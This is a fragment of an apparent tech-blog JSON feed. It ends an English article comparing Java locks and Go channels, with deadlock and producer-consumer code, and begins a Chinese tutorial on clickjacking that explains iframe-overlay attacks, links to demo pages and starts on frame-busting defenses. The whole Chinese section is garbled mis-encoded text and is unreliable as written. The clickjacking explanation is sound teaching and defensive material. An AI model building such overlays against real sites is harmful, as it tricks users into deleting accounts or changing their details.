punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Produce : \"</span> <span class=\"token operator\">+</span> item<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                con<span class=\"token punctuation\">.</span><span class=\"token function\">signal</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                lock<span class=\"token punctuation\">.</span><span class=\"token function\">unlock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            producer<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><br><br>        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">100</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">var</span> consumer <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> <span class=\"token punctuation\">{</span><br>                lock<span class=\"token punctuation\">.</span><span class=\"token function\">lock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>queue<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                    <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span><br>                        con<span class=\"token punctuation\">.</span><span class=\"token function\">await</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">InterruptedException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                    <span class=\"token punctuation\">}</span><br>                <span class=\"token punctuation\">}</span><br>                <span class=\"token keyword\">var</span> item <span class=\"token operator\">=</span> queue<span class=\"token punctuation\">.</span><span class=\"token function\">remove</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Consume : \"</span> <span class=\"token operator\">+</span> item<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                con<span class=\"token punctuation\">.</span><span class=\"token function\">signal</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                lock<span class=\"token punctuation\">.</span><span class=\"token function\">unlock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            consumer<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><br>    <span class=\"token punctuation\">}</span></code></pre>\n<p>The producer produces an item and passes it to the queue, and the consumer consumes the item from the queue. Every time the producer or consumer access the queue, it must acquire Lock first. So only one thread can access the queue at the same time.<br>\nAlmost all program languages support Lock, so this paradigm can be applied widely.<br>\nBut it's difficult to use Thread &amp; Lock to get right, you may accidentally fail into deadlock, see follow code:</p>\n<pre class=\"language-java\"><code class=\"language-java\">    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">Object</span> cacheLock <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">Object</span> tableLock <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">oneMethod</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">synchronized</span> <span class=\"token punctuation\">(</span>cacheLock<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">synchronized</span> <span class=\"token punctuation\">(</span>tableLock<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hio1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span><br>        <span class=\"token punctuation\">}</span><br>    <span class=\"token punctuation\">}</span><br>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">anotherMethod</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">synchronized</span> <span class=\"token punctuation\">(</span>tableLock<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">synchronized</span> <span class=\"token punctuation\">(</span>cacheLock<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hio2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span><br>        <span class=\"token punctuation\">}</span><br>    <span class=\"token punctuation\">}</span><br><br>    <span class=\"token keyword\">public</span>  <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token punctuation\">{</span><br>                <span class=\"token function\">oneMethod</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                <span class=\"token function\">anotherMethod</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>        <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token punctuation\">{</span><br>                <span class=\"token function\">anotherMethod</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                <span class=\"token function\">oneMethod</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span></code></pre>\n<p>Threads in line 20 and 25 wait for each other's Lock, and the whole process will block forever.<br>\nWhat's more, deadlock is not obvious in most cases. Think above code, what if <strong>oneMethod</strong> and <strong>anotherMethod</strong> are provided by a third party, you don't know the behavior inside these two methods, you don't know how they use Lock until you trace source code, so you may probably use these two methods in the wrong way that could cause deadlock.</p>\n<h1 id=\"communicating-sequential-process(csp)\"><a class=\"direct-link\" href=\"#communicating-sequential-process(csp)\">#</a> Communicating Sequential Process(CSP)</h1>\n<p>Compare to Thread &amp; Lock paradigm that communicates by sharing memory, CSP paradigm encourages to share by communicating, every thread sends/receives the message to/from each other. Looks like:</p>\n<p><img src=\"/img/posts/genchilu/concurrency_paradigms_golang_and_Java/csp.png\" alt=\"\"></p>\n<p>And Golang's concurrency paradigm's design principle is base on CSP. <a href=\"https://go.dev/blog/codelab-share\">Golang's offical blog</a> means:</p>\n<blockquote>\n<p>Do not communicate by sharing memory; instead, share memory by communicating.</p>\n</blockquote>\n<p>Also, you can see the comment in the document of Golang Sync package:</p>\n<blockquote>\n<p>Package sync provides basic synchronization primitives such as mutual exclusion locks. Other than the Once and WaitGroup types, most are intended for use by low-level library routines. Higher-level synchronization is better done via channels and communication.</p>\n</blockquote>\n<p>So the implementation of producer-comsumer problem in Golang would like:</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\tqueue <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span><br><br>\t<span class=\"token comment\">// producer</span><br>\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">100</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t\t\titem <span class=\"token operator\">:=</span> rand<span class=\"token punctuation\">.</span><span class=\"token function\">Intn</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><br>\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Produce: %d\\n\"</span><span class=\"token punctuation\">,</span> item<span class=\"token punctuation\">)</span><br>\t\t\tqueue <span class=\"token operator\">&lt;-</span> item<br>\t\t<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token punctuation\">}</span><br><br>\t<span class=\"token comment\">// consumer</span><br>\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">100</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t\t\titem <span class=\"token operator\">:=</span> <span class=\"token operator\">&lt;-</span>queue<br>\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Consume: %d\\n\"</span><span class=\"token punctuation\">,</span> item<span class=\"token punctuation\">)</span><br>\t\t<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token punctuation\">}</span><br><br><span class=\"token punctuation\">}</span></code></pre>\n<p>Developers can easily use channel without caring about the sophisticated mutex. In the aspect of high level, Golang decouples goroutines by channel instead of coupling all threads together by share memory, like Java using Thread &amp; Lock.<br>\nBut that does costâ€Š-â€ŠGolang's channel does not pass the original item, instead, channel would copy items from/to the sender/receiver. You may check with the following code:</p>\n<pre class=\"language-go\"><code class=\"language-go\">\t<span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t\titem <span class=\"token operator\">:=</span> rand<span class=\"token punctuation\">.</span><span class=\"token function\">Intn</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><br>\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Produce item Addr: %v\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>item<span class=\"token punctuation\">)</span><br>\t\tqueue <span class=\"token operator\">&lt;-</span> item<br>\t<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br><br>\t<span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t\titem <span class=\"token operator\">:=</span> <span class=\"token operator\">&lt;-</span>queue<br>\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Consume item Addr: %v\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>item<span class=\"token punctuation\">)</span><br>\t<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n<p>and the memory address is different.</p>\n<pre class=\"language-text\"><code class=\"language-text\">roduce item Addr: 0xc000014090<br>Consume item Addr: 0xc000120000</code></pre>\n<p>Copying items will decrease performance more or less, that is the cost to decouple goroutine.</p>\n<h1 id=\"conculsion\"><a class=\"direct-link\" href=\"#conculsion\">#</a> Conculsion</h1>\n<p>In this article, we mention that Java's concurrency paradigm is base on Thread &amp; Lock does not mean that you can not write Java's concurrency code like CSP. For example, you can use BlockingQueue. Similarly, Golang provides Mutex or RWMutex to developers who are familiar with Lock, too.<br>\nWhat I want to say is you may see lots of Thread &amp; Lock in Java's project more than CSP, you would see that thread-safe terms in Java's ecosystem, but You may see that Golang developers are caring more about select &amp; channel while writing concurrency.<br>\nIn the next article, I will introduce some common concurrency patterns with channel &amp; select in Goalng's blog and compare that to Java. I think that may uncover more differences between these two paradigms.</p>\n<h1 id=\"reference\"><a class=\"direct-link\" href=\"#reference\">#</a> Reference</h1>\n<p><a href=\"https://www.youtube.com/watch?v=KBZlN0izeiY\">GopherCon 2017: Kavya Joshiâ€Š-â€ŠUnderstanding Channels</a><br>\n<a href=\"https://pragprog.com/titles/pb7con/seven-concurrency-models-in-seven-weeks/\">Seven Concurrency Models in Seven Weeks When Threads Unravel</a></p>\n",
      "date_published": "2021-08-29T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/huli/clickjacking-intro/",
      "url": "https://tech-blog.cymetrics.io/posts/huli/clickjacking-intro/",
      "title": "ä¸è­˜å»¬å±±çœŸé¢ç›®ï¼šClickjacking é»æ“ŠåŠ«æŒæ”»æ“Š",
      "content_html": "<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> å‰è¨€</h2>\n<!-- summary -->\n<p>åœ¨é‡å°å‰ç«¯çš„å„ç¨®æ”»æ“Šæ‰‹æ³•ä¹‹ä¸­ï¼Œæˆ‘è¦ºå¾— clickjacking æ˜¯ç›¸ç•¶æœ‰è¶£çš„ä¸€å€‹ã€‚å®ƒçš„ä¸­æ–‡ç¿»è­¯é€šå¸¸ç¿»æˆã€Œé»æ“ŠåŠ«æŒã€ï¼Œå¯¦éš›ä¸Šçš„æ„æ€æ˜¯ä½ ä»¥ç‚ºé»äº† A ç¶²é çš„æ±è¥¿ï¼Œå…¶å¯¦å»æ˜¯é»åˆ°äº† B ç¶²é ï¼Œæƒ¡æ„ç¶²é åŠ«æŒäº†ä½¿ç”¨è€…çš„é»æ“Šï¼Œè®“ä½¿ç”¨è€…é»åˆ°æ„æ–™ä¹‹å¤–çš„åœ°æ–¹ã€‚</p>\n<!-- summary -->\n<p>åªæ˜¯ä¸€å€‹é»æ“Šè€Œå·²ï¼Œé€™æ¨£æœƒæœ‰ä»€éº¼å±å®³å—ï¼Ÿ</p>\n<p>å‡è¨­åœ¨èƒŒå¾Œçš„æ˜¯ä¸€å€‹éŠ€è¡Œè½‰å¸³é é¢ï¼Œè€Œä¸”å¸³è™Ÿè·Ÿé‡‘é¡éƒ½å¡«å¥½äº†ï¼Œåªè¦æŒ‰ä¸€å€‹æŒ‰éˆ•å°±æœƒè½‰éŒ¢å‡ºå»ï¼Œé€™æ¨£çš„è©±å±å®³å°±å¾ˆå¤§äº†ï¼ˆä¸éé€™é€šå¸¸ä¸å¤ªå¯èƒ½å•¦ï¼Œå› ç‚ºè½‰å¸³é‚„éœ€è¦è¼¸å…¥ OTP ä¹‹é¡çš„ï¼Œé€™åªæ˜¯èˆ‰ä¾‹ï¼‰ã€‚</p>\n<p>æˆ–æ˜¯èˆ‰å€‹æ›´å¸¸è¦‹çš„ä¾‹å­ï¼Œä¾‹å¦‚èªªæœ‰å€‹ä¹çœ‹ä¹‹ä¸‹æ˜¯å–æ¶ˆè¨‚é–±é›»å­å ±çš„é é¢ï¼Œæ–¼æ˜¯ä½ é»äº†ã€Œç¢ºå®šå–æ¶ˆã€çš„æŒ‰éˆ•ï¼Œä½†å…¶å¯¦åº•ä¸‹è—è‘—çš„æ˜¯ Facebook çš„æŒ‰è®šéˆ•ï¼Œæ‰€ä»¥ä½ ä¸ä½†æ²’æœ‰å–æ¶ˆè¨‚é–±ï¼Œé‚„è¢«é¨™äº†ä¸€å€‹è®šï¼ˆå› ç‚ºåŠ«æŒçš„ç›®æ¨™æ˜¯è®šï¼Œæ‰€ä»¥åˆç¨±ç‚º likejackingï¼‰ã€‚</p>\n<p>é€™ç¯‡æ–‡ç« æˆ‘æœƒä»‹ç´¹ clickjacking çš„æ”»æ“ŠåŸç†ã€é˜²ç¦¦æ–¹å¼ä»¥åŠå¯¦éš›æ¡ˆä¾‹ï¼Œè®“å¤§å®¶æ›´äº†è§£é€™å€‹æ”»æ“Šæ‰‹æ³•ã€‚</p>\n<h2 id=\"clickjacking-%E6%94%BB%E6%93%8A%E5%8E%9F%E7%90%86\"><a class=\"direct-link\" href=\"#clickjacking-%E6%94%BB%E6%93%8A%E5%8E%9F%E7%90%86\">#</a> Clickjacking æ”»æ“ŠåŸç†</h2>\n<p>Clickjacking çš„åŸç†å°±æ˜¯æŠŠå…©å€‹ç¶²é ç–Šåœ¨ä¸€èµ·ï¼Œé€é CSS è®“ä½¿ç”¨è€…çœ‹è¦‹çš„æ˜¯ A ç¶²é ï¼Œä½†é»åˆ°çš„å»æ˜¯ B ç¶²é ã€‚</p>\n<p>ä»¥æ¯”è¼ƒæŠ€è¡“çš„è¬›æ³•ä¾†èªªï¼Œå°±æ˜¯ç”¨ iframe æŠŠ B ç¶²é åµŒå…¥ç„¶å¾Œè¨­é€æ˜åº¦ 0.001ï¼Œå†ç”¨ CSS æŠŠè‡ªå·±çš„å…§å®¹ç–Šä¸Šå»ï¼Œå°±å¤§åŠŸå‘Šæˆäº†ã€‚</p>\n<p>æˆ‘è¦ºå¾— clickjacking ç›´æ¥çœ‹ç¯„ä¾‹æ˜¯æœ€æœ‰è¶£çš„ï¼Œå› æ­¤åšäº†ä¸€äº›ç°¡å–®çš„ç¯„ä¾‹ã€‚</p>\n<p>åº•ä¸‹é€™å€‹ç¯„ä¾‹å¯ä»¥å…ˆé»æ“Šã€Œç¢ºå®šå–æ¶ˆã€çš„æŒ‰éˆ•ï¼Œç„¶å¾Œå†é»ã€Œåˆ‡æ›é€æ˜åº¦ã€ï¼Œå°±å¯ä»¥çœ‹åˆ°èƒŒå¾Œå…¶å¯¦æ˜¯ä¿®æ”¹å€‹äººè³‡æ–™çš„é é¢ä»¥åŠåˆªé™¤å¸³è™Ÿçš„æŒ‰éˆ•ï¼š</p>\n<iframe src=\"https://aszx87410.github.io/demo/clickjacking/\" width=\"320\" height=\"430\"></iframe>\n<p>æ‰€ä»¥æˆ‘ä»¥ç‚ºæˆ‘é»äº†ã€Œç¢ºå®šå–æ¶ˆã€ï¼Œä½†å¯¦éš›ä¸Šé»åˆ°çš„å»æ˜¯ã€Œåˆªé™¤å¸³è™Ÿã€ï¼Œé€™å°±æ˜¯ clickjackingã€‚</p>\n<p>ä¸Šé¢çš„ iframe å¦‚æœæ‰“ä¸é–‹ï¼Œå¯ä»¥å»é€™é‚Šç©ï¼š<a href=\"https://aszx87410.github.io/demo/clickjacking/\">clickjacking ç¯„ä¾‹</a>ã€‚</p>\n<p>æœ‰äº›äººå¯èƒ½æœƒè¦ºå¾—é€™å€‹ç¯„ä¾‹å¤ªéç°¡å–®ï¼Œå¯¦éš›æ‡‰ç”¨ä¸­å¯èƒ½å¾ˆå°‘å‡ºç¾é€™ç¨®é€™éº¼ç°¡å–®çš„æ”»æ“Šï¼Œåªè¦æŒ‰ä¸€å€‹æŒ‰éˆ•è€Œå·²ï¼Œæˆ–è¨±æ›´å¤šç¶²ç«™æœƒæ›´è¤‡é›œä¸€é»ï¼Œä¾‹å¦‚èªªè¦å…ˆè¼¸å…¥ä¸€å€‹ä»€éº¼æ±è¥¿ï¼Ÿ</p>\n<p>åº•ä¸‹é€™å€‹ç¯„ä¾‹ä»¥ã€Œæ›´æ”¹ emailã€é€™å€‹åŠŸèƒ½ä¾†è¨­è¨ˆ clickjackingï¼Œæ¯”èµ·å‰ä¸€å€‹ç¯„ä¾‹æ˜¯æ•´å€‹ç¶²é è“‹éå»ï¼Œé€™å€‹ç¯„ä¾‹åˆ»æ„ç•™ä¸‹åŸç¶²é çš„ inputï¼Œå…¶ä»–éƒ½ç”¨ CSS è“‹æ‰ï¼ŒæŒ‰éˆ•çš„éƒ¨åˆ†ç”¨ <code>pointer-events:none</code> è®“äº‹ä»¶ç©¿é€ã€‚</p>\n<p>çœ‹ä¼¼æ˜¯ä¸€å€‹è¼¸å…¥ email è¨‚é–±è³‡è¨Šçš„ç¶²é ï¼Œä½†æŒ‰ä¸‹ç¢ºå®šä¹‹å¾Œå»è·³å‡ºã€Œä¿®æ”¹ email æˆåŠŸã€ï¼Œå› ç‚ºèƒŒå¾Œå…¶å¯¦æ˜¯å€‹ä¿®æ”¹ email çš„ç¶²é ï¼š</p>\n<iframe src=\"https://aszx87410.github.io/demo/clickjacking/adv.html\" width=\"340\" height=\"450\"></iframe>\n<p>ä¸Šé¢çš„ç¯„ä¾‹æ²’çœ‹åˆ°çš„è©±ï¼Œå¯ä»¥å»é€™é‚Šç©ï¼š<a href=\"https://aszx87410.github.io/demo/clickjacking/adv.html\">é€²éš clickjacking ç¯„ä¾‹</a>ã€‚</p>\n<p>é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä¹Ÿæœ‰åœ¨<a href=\"https://blog.miniasp.com/post/2008/10/11/The-latest-cross-browser-exploit-Clickjacking\">æœ€æ–°çš„è·¨ç€è¦½å™¨æ”»æ“Šæ‰‹æ³•ï¼šClickjacking</a> é€™ç¯‡è£¡é¢çœ‹åˆ°ä¸€å€‹å¾ˆæœ‰è¶£çš„ç¯„ä¾‹ï¼š<a href=\"https://www.youtube.com/watch?v=gxyLbpldmuU\">å‡éŠæˆ²çœŸåŠ«æŒï¼ˆYouTube å½±ç‰‡ï¼‰</a>ï¼Œçœ‹ä¼¼æ˜¯éŠæˆ²ä½†å…¶å¯¦åªæ˜¯ç‚ºäº†è®“ä½ å»é»æŒ‰éˆ•ï¼Œè¶…ç´šæœ‰è¶£ï¼</p>\n<p>å¯«åˆ°é€™é‚Šï¼Œå¹« clickjacking åšå€‹ç¸½çµï¼Œé€™å€‹æ”»æ“Šæ‰‹æ³•å¤§æ¦‚å°±æ˜¯ï¼š</p>\n<ol>\n<li>æŠŠç›®æ¨™ç¶²é åµŒå…¥æƒ¡æ„ç¶²é ä¹‹ä¸­ï¼ˆé€é iframe æˆ–å…¶ä»–é¡ä¼¼æ¨™ç±¤ï¼‰</li>\n<li>åœ¨æƒ¡æ„ç¶²é ä¸Šç”¨ CSS æŠŠç›®æ¨™ç¶²é è“‹ä½ï¼Œè®“ä½¿ç”¨è€…çœ‹ä¸è¦‹</li>\n<li>èª˜å°ä½¿ç”¨è€…å‰å¾€æƒ¡æ„ç¶²é ä¸¦ä¸”åšå‡ºæ“ä½œï¼ˆè¼¸å…¥æˆ–é»æ“Šç­‰ç­‰ï¼‰</li>\n<li>è§¸ç™¼ç›®æ¨™ç¶²é è¡Œç‚ºï¼Œé”æˆæ”»æ“Š</li>\n</ol>\n<p>å› æ­¤å¯¦éš›ä¸Šæ”»æ“Šçš„é›£æ˜“åº¦ï¼Œå–æ±ºæ–¼ä½ çš„æƒ¡æ„ç¶²ç«™è¨­è¨ˆå¾—æ€éº¼æ¨£ï¼Œä»¥åŠç›®æ¨™ç¶²é çš„åŸå§‹è¡Œç‚ºéœ€è¦å¤šå°‘äº’å‹•ã€‚èˆ‰ä¾‹ä¾†èªªï¼Œé»æ“ŠæŒ‰éˆ•å°±æ¯”è¼¸å…¥è³‡è¨Šè¦å®¹æ˜“å¾—å¤šã€‚</p>\n<p>ç„¶å¾Œé‚„è¦æé†’ä¸€é»ï¼Œé€™ç¨®æ”»æ“Šè¦é”æˆï¼Œä½¿ç”¨è€…è¦å…ˆåœ¨ç›®æ¨™ç¶²ç«™æ˜¯ç™»å…¥ç‹€æ…‹æ‰è¡Œã€‚åªè¦èƒ½æŠŠç›®æ¨™ç¶²é åµŒå…¥æƒ¡æ„ç¶²é ä¹‹ä¸­ï¼Œå°±æœƒæœ‰ clickjacking çš„é¢¨éšªã€‚</p>\n<h2 id=\"clickjacking-%E9%98%B2%E7%A6%A6%E6%96%B9%E5%BC%8F\"><a class=\"direct-link\" href=\"#clickjacking-%E9%98%B2%E7%A6%A6%E6%96%B9%E5%BC%8F\">#</a> Clickjacking é˜²ç¦¦æ–¹å¼</h2>\n<p>å¦‚åŒå‰é¢æ‰€è¿°ï¼Œåªè¦èƒ½è¢«å…¶ä»–ç¶²é åµŒå…¥å°±æœƒæœ‰é¢¨éšªï¼Œæ›å¥è©±èªªï¼Œå¦‚æœæ²’è¾¦æ³•è¢«åµŒå…¥ï¼Œå°±ä¸æœƒæœ‰ clickjacking çš„å•é¡Œäº†ï¼Œé€™å°±æ˜¯è§£æ±º clickjacking çš„æ–¹å¼ã€‚</p>\n<p>ä¸€èˆ¬ä¾†èªªé»æ“ŠåŠ«æŒçš„é˜²ç¦¦æ–¹å¼å¯ä»¥åˆ†ç‚ºå…©ç¨®ï¼Œä¸€ç¨®æ˜¯è‡ªå·±ç”¨ JavaScript æª¢æŸ¥ï¼Œå¦ä¸€ç¨®æ˜¯é€é response header å‘ŠçŸ¥ç€è¦½å™¨é€™å€‹ç¶²é æ˜¯å¦èƒ½è¢«åµŒå…¥ã€‚</p>\n<h3 id=\"frame-busting\"><a class=\"direct-link\" href=\"#frame-busting\">#</a> Frame busting</h3>\n<p>æœ‰ä¸€ç¨®å«åš frame busting çš„æ–¹å¼ï¼Œå°±æ˜¯æˆ‘å‰é¢æåˆ°çš„è‡ªå·±ç”¨ JavaScript æª¢æŸ¥ï¼ŒåŸç†å¾ˆç°¡å–®ï¼Œç¨‹å¼ç¢¼ä¹Ÿå¾ˆç°¡å–®ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>top <span class=\"token operator\">!==</span> self<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  top<span class=\"token punctuation\">.</span>location <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>location<br><span class=\"token punctuation\">}</span></code></pre>\n<p>æ¯ä¸€å€‹ç¶²é éƒ½æœ‰è‡ªå·±çš„ window objectï¼Œè€Œ <code>window.self</code> æŒ‡å‘çš„æœƒæ˜¯è‡ªå·±çš„ windowï¼Œé‚£ top çš„è©±å°±æ˜¯ top windowï¼Œå¯ä»¥æƒ³æˆæ˜¯é€™æ•´å€‹ç€è¦½å™¨çš„ã€Œåˆ†é ã€æœ€ä¸Šå±¤çš„ windowã€‚</p>\n<p>å¦‚æœä»Šå¤©æ˜¯è¢«ç¨ç«‹é–‹å•Ÿçš„ç¶²é ï¼Œé‚£ top è·Ÿ self å°±æœƒæŒ‡å‘åŒä¸€å€‹ windowï¼Œä½†å¦‚æœä»Šå¤©ç¶²é æ˜¯è¢«é‘²åœ¨ iframe è£¡é¢ï¼Œtop æŒ‡çš„å°±æœƒæ˜¯ä½¿ç”¨ iframe çš„é‚£å€‹ 